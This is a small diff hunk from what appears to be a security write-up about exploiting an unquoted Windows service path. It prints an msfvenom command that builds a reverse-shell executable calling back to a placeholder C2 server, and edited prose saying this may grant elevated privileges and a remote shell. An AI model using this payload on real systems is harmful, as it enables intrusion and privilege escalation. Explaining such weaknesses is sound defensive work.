@@ -14,7 +14,7 @@ could allow an attacker to do almost anything. It all depends on the malicious p
 
 msfvenom p windows/shell_reverse_tcp LHOST=[C2 server] LPORT=4444 -f exe > Program.exe
 
-And depending on the permissions used to call that unquoted path it may even give me elevated permissions. 
+And depending on the permissions used to call that unquoted path it may even give me elevated priviledges in addition to a remote shell. 
 
 
 
